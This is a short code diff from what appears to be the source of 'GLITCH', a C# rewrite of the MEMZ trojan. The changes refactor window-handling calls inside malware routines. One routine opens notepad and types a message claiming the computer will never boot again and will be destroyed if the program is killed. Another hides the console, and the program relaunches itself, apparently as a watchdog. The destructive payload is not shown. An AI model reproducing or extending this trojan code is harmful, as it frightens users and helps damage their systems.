@@ -25,7 +25,7 @@ namespace Misc
         {
             Process proc = Process.Start("notepad.exe");
             proc.WaitForInputIdle();
-            Wnd32.fromHandle(proc.MainWindowHandle).isForeground = true;
+            proc.GetMainWindow().IsForeground = true;
             const string msg =
                 "YOUR COMPUTER HAS BEEN FUCKED BY GLITCH,\nA REWRITE OF THE MEMZ TROJAN.\n\nYour computer won't boot up again,\nso use it as long as you can!\n\n:D\n\nTrying to kill GLITCH will cause your system to be\ndestroyed instantly, so don't try it :D";
             SendKeys.SendWait(msg);
@@ -37,7 +37,7 @@ namespace Misc
                 Process.Start(Process.GetCurrentProcess().MainModule.FileName, "wd");
         }
 
-        public static void HideCmd() => Wnd32.fromHandle(Process.GetCurrentProcess().MainWindowHandle).shown = false;
+        public static void HideCmd() => Process.GetCurrentProcess().GetMainWindow().Shown = false;
 
         public static void LaunchIncrementor()
         {
